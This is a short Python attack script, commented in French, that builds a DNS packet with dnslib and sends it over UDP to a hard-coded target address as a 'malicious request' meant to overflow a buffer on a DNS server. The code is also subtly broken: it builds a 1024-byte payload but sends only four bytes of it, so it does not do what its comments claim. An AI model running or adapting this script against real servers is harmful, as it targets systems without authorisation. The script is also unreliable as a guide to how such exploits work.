import socket
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR

def send_malicious_request(target_ip, target_port=53):
    try:
        # Construire l'en-tête de la requête
        header = DNSHeader(id=12345, qr=0, rd=1)
        question = DNSQuestion("example.com", QTYPE.A)

        # Construire une réponse DNS brute
        payload = b"A" * 1024  # Dépassement de mémoire tampon
        fake_response = b'\xc0\x0c' + b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + payload[:4]

        # Assemblage manuel du paquet DNS
        dns_record = DNSRecord(header, q=question)
        packet = dns_record.pack() + fake_response

        # Envoi de la requête malveillante
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(packet, (target_ip, target_port))
        print("[*] Requête malveillante envoyée à {}:{}.".format(target_ip, target_port))
        sock.close()

    except Exception as e:
        print("[!] Une erreur s'est produite :", str(e))

# Modifier l'adresse IP de la cible ici
target_ip = "192.168.136.2"
send_malicious_request(target_ip)
